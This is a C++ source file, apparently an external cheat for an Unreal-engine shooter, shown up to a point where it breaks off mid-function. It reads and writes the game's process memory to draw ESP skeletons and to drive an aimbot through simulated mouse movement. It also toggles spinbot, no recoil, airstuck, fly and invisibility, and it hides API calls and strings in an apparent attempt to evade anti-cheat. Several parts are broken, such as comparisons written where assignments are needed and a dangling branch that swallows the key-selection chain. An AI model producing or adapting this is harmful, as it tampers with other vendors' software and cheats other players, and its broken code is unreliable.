#include "includes.h"

using namespace std;

ImFont* Verdana, * DefaultFont;
ImFont* m_pFont;
DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR PlayerState;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Persistentlevel;
DWORD_PTR PlayerCamManager;
Vector3 localactorpos;
uint64_t TargetPawn;
D3DPRESENT_PARAMETERS d3dpp;

int localplayerID;
int CurrentActorId;
static void xInitD3d();
void actorloop();
static void xMainLoop();
static void xShutdown();
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

std::uintptr_t process_find(const std::string& name)
{
	const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 proc_entry{};
	proc_entry.dwSize = sizeof proc_entry;

	auto found_process = false;
	if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
		do {
			if (name == proc_entry.szExeFile) {
				found_process = true;
				break;
			}
		} while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
	}

	LI_FN(CloseHandle).safe()(snap);
	return found_process
		? proc_entry.th32ProcessID
		: 0;
}
void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);

	ImGui::StyleColorsDark();
	ImGuiStyle& style = ImGui::GetStyle();
	style.WindowTitleAlign = ImVec2(10.0f, 10.5f);
	style.FrameRounding = 2.f; //button rundung
	style.FrameBorderSize = 0.0f; //runherum striche dicke
    style.ScrollbarSize = 0.0f;
	style.ScrollbarRounding = 0.0f;
	style.GrabRounding = 0.0f;

	style.Colors[ImGuiCol_Text] = ImColor(255, 255, 255); //text
	style.Colors[ImGuiCol_TextDisabled] = ImColor(0, 0, 0); //text
	style.Colors[ImGuiCol_WindowBg] = ImColor(-0, -0, -0); //der komplette hintergrund
	style.Colors[ImGuiCol_Separator] = ImColor(255, 0, 0); //keine Ahnung

	style.Colors[ImGuiCol_ChildBg] = ImColor(0, 0, 0); //Keine Ahnung
	style.Colors[ImGuiCol_PopupBg] = ImColor(0, 0, 0); //keine Ahnung
	style.Colors[ImGuiCol_PopupBg] = ImColor(0, 0, 0); //Keine Ahnung
	style.Colors[ImGuiCol_TitleBgCollapsed] = ImColor(0, 0, 0); //keine Ahnung

	style.Colors[ImGuiCol_Border] = ImColor(74, 74, 74); //runherum die striche
	style.Colors[ImGuiCol_FrameBg] = ImColor(74, 74, 74); //checkbox wenn nicht aktiv
	style.Colors[ImGuiCol_FrameBgHovered] = ImColor(116, 116, 116); //wenn man auf die box drauf ist
	style.Colors[ImGuiCol_FrameBgActive] = ImColor(74, 74, 74); //wenn man drauf klickt auf die box
	style.Colors[ImGuiCol_TitleBg] = ImColor(74, 74, 74); //namen bar wenn man nicht auf dem cheat ist
	style.Colors[ImGuiCol_TitleBgActive] = ImColor(74, 74, 74); //namen bar wenn man auf dem cheat ist
	style.Colors[ImGuiCol_CheckMark] = ImColor(255, 0, 0); //check Marker
	style.Colors[ImGuiCol_SliderGrab] = ImColor(255, 0, 0); //der slider wenn nicht aktiv
	style.Colors[ImGuiCol_SliderGrabActive] = ImColor(255, 0, 0); //der slider wenn aktiv
	style.Colors[ImGuiCol_Button] = ImColor(255, 0, 0); //die buttons wenn man nicht drauf ist
	style.Colors[ImGuiCol_ButtonHovered] = ImColor(255, 0, 0); //wenn man auf die buttons drauf ist
	style.Colors[ImGuiCol_ButtonActive] = ImColor(255, 0, 0); //wenn man auf die buttons drauf drückt

	XorS(font, "C:\\Windows\\Fonts\\Impact.ttf");
	m_pFont = io.Fonts->AddFontFromFileTTF(font.decrypt(), 14.5f, nullptr, io.Fonts->GetGlyphRangesDefault());

	p_Object->Release();
}

double NRX;
double NRY;

void aimbot(float x, float y)
{
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	int AimSpeed = smooth;
	float TargetX = 0;
	float TargetY = 0;

	if (x != 0)
	{
		if (x > ScreenCenterX)
		{
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX)
		{
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0)
	{
		if (y > ScreenCenterY)
		{
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY)
		{
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);
	return;
}

void AimAt(DWORD_PTR entity)
{
	uint64_t currentactormesh = read<uint64_t>(entity + 0x318);
	auto rootHead = getbone(currentactormesh, hitbox);
	Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
	//updated by jeremylovecats
	if (rootHeadOut.y != 0 || rootHeadOut.y != 0)
	{
		aimbot(rootHeadOut.x, rootHeadOut.y);
	}
}

bool IsVisible(uintptr_t mesh)
{
	float LastSumbitTime = read<float>(mesh + OFFSETS::LastSubmitTime);
	float LastRenderTimeOnScreen = read<float>(mesh + OFFSETS::LastRenderTimeOnScreen);

	bool Visible = LastRenderTimeOnScreen + 0.06f >= LastSumbitTime;

	return Visible;
}

uint64_t CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::MESH);
#define PI (3.141592653589793f)

// skeleton
__forceinline auto skeleton(uintptr_t mesh) -> void
{
	const int color = ImColor(1.0f, 1.0f, 1.0f);


	Vector3 bonePositions[] = {
		getbone(mesh, 109),  // HeadBone
		getbone(mesh, 2),   // Hip
		getbone(mesh, 66),  // Neck
		getbone(mesh, 9),   // UpperArmLeft
		getbone(mesh, 38),  // UpperArmRight
		getbone(mesh, 10),  // LeftHand
		getbone(mesh, 39),  // RightHand
		getbone(mesh, 11),  // LeftHand1
		getbone(mesh, 40),  // RightHand1
		getbone(mesh, 78),  // RightThigh
		getbone(mesh, 71),  // LeftThigh
		getbone(mesh, 79),  // RightCalf
		getbone(mesh, 72),  // LeftCalf
		getbone(mesh, 75),  // LeftFoot         
		getbone(mesh, 82),   // RightFoot     


	};

	Vector3 bonePositionsOut[16];
	for (int i = 0; i < 16; ++i) {
		bonePositionsOut[i] = ProjectWorldToScreen(bonePositions[i]);
	}

	if (IsVisible(mesh)) {

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[1].x, bonePositionsOut[1].y), ImVec2(bonePositionsOut[2].x, bonePositionsOut[2].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[3].x, bonePositionsOut[3].y), ImVec2(bonePositionsOut[2].x, bonePositionsOut[2].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[4].x, bonePositionsOut[4].y), ImVec2(bonePositionsOut[2].x, bonePositionsOut[2].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[5].x, bonePositionsOut[5].y), ImVec2(bonePositionsOut[3].x, bonePositionsOut[3].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[6].x, bonePositionsOut[6].y), ImVec2(bonePositionsOut[4].x, bonePositionsOut[4].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[5].x, bonePositionsOut[5].y), ImVec2(bonePositionsOut[7].x, bonePositionsOut[7].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[6].x, bonePositionsOut[6].y), ImVec2(bonePositionsOut[8].x, bonePositionsOut[8].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[10].x, bonePositionsOut[10].y), ImVec2(bonePositionsOut[1].x, bonePositionsOut[1].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[9].x, bonePositionsOut[9].y), ImVec2(bonePositionsOut[1].x, bonePositionsOut[1].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[12].x, bonePositionsOut[12].y), ImVec2(bonePositionsOut[10].x, bonePositionsOut[10].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[11].x, bonePositionsOut[11].y), ImVec2(bonePositionsOut[9].x, bonePositionsOut[9].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[13].x, bonePositionsOut[13].y), ImVec2(bonePositionsOut[12].x, bonePositionsOut[12].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[14].x, bonePositionsOut[14].y), ImVec2(bonePositionsOut[11].x, bonePositionsOut[11].y), ImColor(SkeletonVisible[0] * 255, SkeletonVisible[1] * 255, SkeletonVisible[2] * 255), Skeleton_Thickness);
	}


	if (!IsVisible(mesh)) {

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[1].x, bonePositionsOut[1].y), ImVec2(bonePositionsOut[2].x, bonePositionsOut[2].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[3].x, bonePositionsOut[3].y), ImVec2(bonePositionsOut[2].x, bonePositionsOut[2].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[4].x, bonePositionsOut[4].y), ImVec2(bonePositionsOut[2].x, bonePositionsOut[2].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[5].x, bonePositionsOut[5].y), ImVec2(bonePositionsOut[3].x, bonePositionsOut[3].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[6].x, bonePositionsOut[6].y), ImVec2(bonePositionsOut[4].x, bonePositionsOut[4].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[5].x, bonePositionsOut[5].y), ImVec2(bonePositionsOut[7].x, bonePositionsOut[7].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[6].x, bonePositionsOut[6].y), ImVec2(bonePositionsOut[8].x, bonePositionsOut[8].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[10].x, bonePositionsOut[10].y), ImVec2(bonePositionsOut[1].x, bonePositionsOut[1].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[9].x, bonePositionsOut[9].y), ImVec2(bonePositionsOut[1].x, bonePositionsOut[1].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[12].x, bonePositionsOut[12].y), ImVec2(bonePositionsOut[10].x, bonePositionsOut[10].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[11].x, bonePositionsOut[11].y), ImVec2(bonePositionsOut[9].x, bonePositionsOut[9].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[13].x, bonePositionsOut[13].y), ImVec2(bonePositionsOut[12].x, bonePositionsOut[12].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bonePositionsOut[14].x, bonePositionsOut[14].y), ImVec2(bonePositionsOut[11].x, bonePositionsOut[11].y), ImColor(SkeletonNotVisible[0] * 255, SkeletonNotVisible[1] * 255, SkeletonNotVisible[2] * 255), Skeleton_Thickness);
	}

}
void loop() {

	while (true) {

		cache::uworld = read<uintptr_t>(base_address + UWORLD);
		cache::game_instance = read<uintptr_t>(cache::uworld + GAME_INSTANCE);
		cache::local_players = read<uintptr_t>(read<uintptr_t>(cache::game_instance + LOCAL_PLAYERS));
		cache::player_controller = read<uintptr_t>(cache::local_players + PLAYER_CONTROLLER);
		cache::local_pawn = read<uintptr_t>(cache::player_controller + LOCAL_PAWN);

		if (cache::local_pawn != 0) {

			cache::root_component = read<uintptr_t>(cache::local_pawn + ROOT_COMPONENT);
			cache::localactorpos = read<Vector3>(cache::root_component + RELATIVE_LOCATION);
			cache::player_state = read<uintptr_t>(cache::local_pawn + PLAYER_STATE);
			cache::my_team_id = read<int>(cache::player_state + TEAM_INDEX);
		}

		cache::game_state = read<uintptr_t>(cache::uworld + GAME_STATE);
		cache::player_array = read<uintptr_t>(cache::game_state + PLAYER_ARRAY);
		cache::player_count = read<int>(cache::game_state + (PLAYER_ARRAY + sizeof(uintptr_t)));

		(Sleep)(1);
	}
}

void actorloop()
{
	static const auto size = ImGui::GetIO().DisplaySize;
	static const auto center = ImVec2(size.x / 2, size.y / 2);

	if (crosshair)
	{
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2 - 10, Height / 2), ImGui::GetColorU32({ crosshairchick[0], crosshairchick[1], crosshairchick[2], 2 }));
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2 + 10, Height / 2), ImGui::GetColorU32({ crosshairchick[0], crosshairchick[1], crosshairchick[2], 2 }));
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2, Height / 2 - 10), ImGui::GetColorU32({ crosshairchick[0], crosshairchick[1], crosshairchick[2], 2 }));
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2, Height / 2 + 10), ImGui::GetColorU32({ crosshairchick[0], crosshairchick[1], crosshairchick[2], 2 }));
	}
	if (fovcircle) {
		ImVec2 center = ImVec2(ScreenCenterX, ScreenCenterY);
		float radius = float(AimFOV);
		ImU32 color = ImColor({ fovchick[0], fovchick[1], fovchick[2] });
		int numSegments = 100;
		float thickness = 2.5f;
		ImGui::GetOverlayDrawList()->AddCircle(center, radius, color, numSegments, thickness);
	}
	if (filledfov) {
		ImVec2 center = ImVec2(ScreenCenterX, ScreenCenterY);
		float radius = float(AimFOV);
		int numSegments = 100;
		ImU32 color = IM_COL32(0, 0, 0, 160);
		float thickness = 220.0f;
		float outlineThickness = 2.f;
		ImGui::GetOverlayDrawList()->AddCircleFilled(center, radius, color, numSegments);
		ImGui::GetOverlayDrawList()->AddCircle(center, radius, ImColor({ fovchick[0], fovchick[1], fovchick[2] }), thickness, outlineThickness);
	}
	if (squarefov) {
		ImVec2 rectMin = ImVec2(ScreenCenterX - AimFOV, ScreenCenterY - AimFOV);
		ImVec2 rectMax = ImVec2(ScreenCenterX + AimFOV, ScreenCenterY + AimFOV);
		ImU32 color = ImColor({ fovchick[0], fovchick[1], fovchick[2] });
		float rounding = 0.f;
		float thickness = 2.5f;
		ImGui::GetOverlayDrawList()->AddRect(rectMin, rectMax, color, rounding, ImDrawCornerFlags_All, thickness);
	}
	if (SquareFovFilled) {
		ImVec2 rectMin = ImVec2(ScreenCenterX - AimFOV, ScreenCenterY - AimFOV);
		ImVec2 rectMax = ImVec2(ScreenCenterX + AimFOV, ScreenCenterY + AimFOV);
		ImU32 color = ImColor({ fovchick[0], fovchick[1], fovchick[2] });
		float rounding = 0.f;
		float thickness = 2.5f;
		ImGui::GetOverlayDrawList()->AddRectFilled(rectMin, rectMax, IM_COL32(0, 0, 0, 160));
		ImGui::GetOverlayDrawList()->AddRect(rectMin, rectMax, color, rounding, ImDrawCornerFlags_All, thickness);
	}


	// hitboxs

	if (aimbone == 0)
	{
		hitbox = 109; // head
	}
	else if (aimbone == 1)
	{
		hitbox = 66; // neck
	}
	else if (aimbone == 2)
	{
		hitbox = 37; // chest
	}
	else if (aimbone == 3)
	{
		hitbox = 2; // pelvis
	}
	else if (aimbone == 4)

		// aimkeys

		if (aimkeypos == 0)
		{
			aimkey = 0x01;//left mouse button
		}
		else if (aimkeypos == 1)
		{
			aimkey = 0x02;//right mouse button
		}
		else if (aimkeypos == 2)
		{
			aimkey = 0x04;//middle mouse button
		}
		else if (aimkeypos == 3)
		{
			aimkey = 0x05;//x1 mouse button
		}
		else if (aimkeypos == 4)
		{
			aimkey = 0x06;//x2 mouse button
		}
		else if (aimkeypos == 5)
		{
			aimkey = 0x03;//control break processing
		}
		else if (aimkeypos == 6)
		{
			aimkey = 0x08;//backspace
		}
		else if (aimkeypos == 7)
		{
			aimkey = 0x09;//tab
		}
		else if (aimkeypos == 8)
		{
			aimkey = 0x0c;//clear
		}
		else if (aimkeypos == 9)
		{
			aimkey == 0x0D;//enter
		}
		else if (aimkeypos == 10)
		{
			aimkey = 0x10;//shift
		}
		else if (aimkeypos == 11)
		{
			aimkey = 0x11;//ctrl
		}
		else if (aimkeypos == 12)
		{
			aimkey == 0x12;//alt
		}
		else if (aimkeypos == 13)
		{
			aimkey == 0x14;//caps lock
		}
		else if (aimkeypos == 14)
		{
			aimkey == 0x1B;//esc
		}
		else if (aimkeypos == 15)
		{
			aimkey == 0x20;//space
		}
		else if (aimkeypos == 16)
		{
			aimkey == 0x30;//0
		}
		else if (aimkeypos == 17)
		{
			aimkey == 0x31;//1
		}
		else if (aimkeypos == 18)
		{
			aimkey == 0x32;//2
		}
		else if (aimkeypos == 19)
		{
			aimkey == 0x33;//3
		}
		else if (aimkeypos == 20)
		{
			aimkey == 0x34;//4
		}
		else if (aimkeypos == 21)
		{
			aimkey == 0x35;//5
		}
		else if (aimkeypos == 22)
		{
			aimkey == 0x36;//6
		}
		else if (aimkeypos == 23)
		{
			aimkey == 0x37;//7
		}
		else if (aimkeypos == 24)
		{
			aimkey == 0x38;//8
		}
		else if (aimkeypos == 25)
		{
			aimkey == 0x39;//9
		}
		else if (aimkeypos == 26)
		{
			aimkey == 0x41;//a
		}
		else if (aimkeypos == 27)
		{
			aimkey == 0x42;//b
		}
		else if (aimkeypos == 28)
		{
			aimkey == 0x43;//c
		}
		else if (aimkeypos == 29)
		{
			aimkey == 0x44;//d
		}
		else if (aimkeypos == 30)
		{
			aimkey == 0x45;//e
		}
		else if (aimkeypos == 31)
		{
			aimkey == 0x46;//f
		}
		else if (aimkeypos == 32)
		{
			aimkey == 0x47;//g
		}
		else if (aimkeypos == 33)
		{
			aimkey == 0x48;//h
		}
		else if (aimkeypos == 34)
		{
			aimkey == 0x49;//i
		}
		else if (aimkeypos == 35)
		{
			aimkey == 0x4A;//j
		}
		else if (aimkeypos == 36)
		{
			aimkey == 0x4B;//k
		}
		else if (aimkeypos == 37)
		{
			aimkey == 0x4C;//L
		}
		else if (aimkeypos == 38)
		{
			aimkey == 0x4D;//m
		}
		else if (aimkeypos == 39)
		{
			aimkey == 0x4E;//n
		}
		else if (aimkeypos == 40)
		{
			aimkey == 0x4F;//o
		}
		else if (aimkeypos == 41)
		{
			aimkey == 0x50;//p
		}
		else if (aimkeypos == 42)
		{
			aimkey == 0x51;//q
		}
		else if (aimkeypos == 43)
		{
			aimkey == 0x52;//r
		}
		else if (aimkeypos == 44)
		{
			aimkey == 0x53;//s
		}
		else if (aimkeypos == 45)
		{
			aimkey == 0x54;//t
		}
		else if (aimkeypos == 46)
		{
			aimkey == 0x55;//u
		}
		else if (aimkeypos == 47)
		{
			aimkey == 0x56;//v
		}
		else if (aimkeypos == 48)
		{
			aimkey == 0x57;//w
		}
		else if (aimkeypos == 49)
		{
			aimkey == 0x58;//x
		}
		else if (aimkeypos == 50)
		{
			aimkey == 0x59;//y
		}
		else if (aimkeypos == 51)
		{
			aimkey == 0x5A;//z
		}
		else if (aimkeypos == 52)
		{
			aimkey == 0x60;//numpad 0
		}
		else if (aimkeypos == 53)
		{
			aimkey == 0x61;//numpad 1
		}
		else if (aimkeypos == 54)
		{
			aimkey == 0x62;//numpad 2
		}
		else if (aimkeypos == 55)
		{
			aimkey == 0x63;//numpad 3
		}
		else if (aimkeypos == 56)
		{
			aimkey == 0x64;//numpad 4
		}
		else if (aimkeypos == 57)
		{
			aimkey == 0x65;//numpad 5
		}
		else if (aimkeypos == 58)
		{
			aimkey == 0x66;//numpad 6
		}
		else if (aimkeypos == 59)
		{
			aimkey == 0x67;//numpad 7
		}
		else if (aimkeypos == 60)
		{
			aimkey == 0x68;//numpad 8
		}
		else if (aimkeypos == 61)
		{
			aimkey == 0x69;//numpad 9
		}
		else if (aimkeypos == 62)
		{
			aimkey == 0x6A;//multiply
		}

	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;

	for (uint32_t i = 0; i < cache::player_count; i++) {
		cache::player_state = read<uintptr_t>(cache::player_array + (i * sizeof(uintptr_t)));

		auto player = read<uintptr_t>(cache::player_array + i * OFFSETS::CurrentActor);
		auto CurrentActor = read<uintptr_t>(player + OFFSETS::PAWN_PRIVATE);//PawnPrivate

		if (!CurrentActor) {
			continue;
		}
		if (!cache::player_state) continue;
		int player_team_id = read<int>(cache::player_state + TEAM_INDEX);

		if (cache::local_pawn) {


			if (player_team_id == cache::my_team_id) continue;
		}

		cache::pawn_private = read<uintptr_t>(cache::player_state + PAWN_PRIVATE);

		if (!cache::pawn_private) continue;
		if (cache::pawn_private == cache::local_pawn) continue;

		cache::mesh = read<uintptr_t>(cache::pawn_private + MESH);
		if (!cache::mesh) continue;

		ImDrawList* draw_list = ImGui::GetOverlayDrawList();
		Vector3 bone66 = getbone(cache::mesh, 109);
		Vector3 bone0 = getbone(cache::mesh, 0);
		Vector3 bottom = ProjectWorldToScreen(bone0);
		Vector3 Headbox = ProjectWorldToScreen(Vector3(bone66.x, bone66.y, bone66.z + 15));
		Vector3 ProjectWorldToScreenhead = ProjectWorldToScreen(bone66);
		uint64_t CurrentActorMesh = read<uint64_t>(CurrentActor + OFFSETS::MESH);
		Vector3 Headpos = getbone(CurrentActorMesh, 67);
		Vector3 HeadElvar = ProjectWorldToScreen(Vector3(Headpos.x, Headpos.y, Headpos.z));

		float distance = cache::localactorpos.Distance(bone0) / 100.f;

		float BoxHeight = (float)(Headbox.y - bottom.y);
		float BoxWidth = BoxHeight * 0.380f;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)bottom.y;

		float CornerHeight = abs(Headbox.y - bottom.y);
		float CornerWidth = CornerHeight * 0.75;

		if (clientspinbot)
		{
			if (GetAsyncKeyState(VK_W))
			{
				while_rotating = false;

				if (LocalPawn)
				{
					uint64_t MeshA = read<uint64_t>(LocalPawn + 0x310);
					increased_value = increased_value + 100;
					write<Vector3>(MeshA + 0x140, Vector3(1, increased_value, 1));
				}
			}
			else if (!GetAsyncKeyState(VK_LBUTTON))
			{
				if (LocalPawn)
				{
					if (while_rotating)
					{
						uint64_t MeshA = read<uint64_t>(LocalPawn + 0x310);
						write<Vector3>(MeshA + 0x140, Vector3(0, -90, 0));
						while_rotating = false;
					}
				}
			}
		}
		if (tinyplayers)
		{
			auto Mesh = read<uint64_t>(LocalPawn + OFFSETS::MESH);
			write<Vector3>(Mesh + 0x158, { 1, 1, 1 });
			write<Vector3>(Mesh + 0x158, { 1, 1, 1 });
			write<Vector3>(Mesh + 0x158, { 1, 1, 1 });
		}

		if (doublepump)
		{
			uintptr_t CurrentWeapon = read<uintptr_t>(OFFSETS::LOCAL_PAWN + OFFSETS::CurrentWeapon);
			if (CurrentWeapon)
			{
				write<bool>(OFFSETS::CurrentWeapon + OFFSETS::bIgnoreTryToFireSlotCooldownRestriction, true); //AFortWeapon bIgnoreTryToFireSlotCooldownRestriction Updated 29.02.24
			}
		}
		if (noRecoil)
		{
			write<float>(PlayerController + 0x68, -1);
		}
		if (AirStuck) {
			if (GetAsyncKeyState(VK_SHIFT)) {
				write<float>(LocalPawn + 0x68, 0); ////CustomTimeDilation Updated 29.02.24
			}
			else {
				write<float>(LocalPawn + 0x68, 1); ////CustomTimeDilation Updated 29.02.24
			}
		}
		if (carFlytwo)
		{
			uintptr_t CurrentVehicle = read<DWORD_PTR>(LocalPawn + OFFSETS::CurrentVehicle); // CurrentVehicle

			if (CurrentVehicle && GetAsyncKeyState(VK_SHIFT))
			{
				write<bool>(CurrentVehicle + OFFSETS::bUseGravity, false); // bUseGravity : 1 Updated 29.02.24				
			}
			else {
				write<bool>(CurrentVehicle + OFFSETS::bUseGravity, true); // bUseGravity : 1 Updated 29.02.24
			}
			if (carFly)
			{
				uint64_t CurrentVehicle = read<uint64_t>(OFFSETS::LOCAL_PAWN + OFFSETS::CurrentVehicle); //current vehcile 
				if (GetAsyncKeyState(VK_SPACE))write<char>(CurrentVehicle + OFFSETS::bUseGravity, 1); //FortAthenaVehicle::bUseGravity Updated 29.02.24
			}
			if (bigPlayer)
			{
				auto Mesh = read<uint64_t>(LocalPawn + OFFSETS::MESH);
				write<Vector3>(Mesh + 0x158, { 3, 3, 3 });
				write<Vector3>(Mesh + 0x158, { 3, 3, 3 });
				write<Vector3>(Mesh + 0x158, { 3, 3, 3 });
			}
			if (playerFly)
			{
				write<float>(LocalPawn + 0x269c, 1000); // ZiplineSpeedFactor Updated 29.02.24	
				write<bool>(LocalPawn + 0x25a0 + 0x18, true); // ZiplineState Updated 29.02.24	
			}
			if (TPose)
			{
				if (LocalPawn)
				{
					uintptr_t LocalMesh = read<uintptr_t>(LocalPawn + OFFSETS::SkeletalMesh);

					write<int>(OFFSETS::SkeletalMesh + 0xa10, 1); //USkeletalMeshComponent bForceRefpose Updated 29.02.24	

				}
			}
			if (invisible)
			{
				if (OFFSETS::LOCAL_PAWN)
				{
					auto Mesh = read<uint64_t>(OFFSETS::LOCAL_PAWN + OFFSETS::MESH);
					write<Vector3>(Mesh + 0x150, Vector3(0, 0, 0));  //RelativeScale3D 0x150 Updated 29.02.24
				}
			}
			if (NoBloom) {
			}
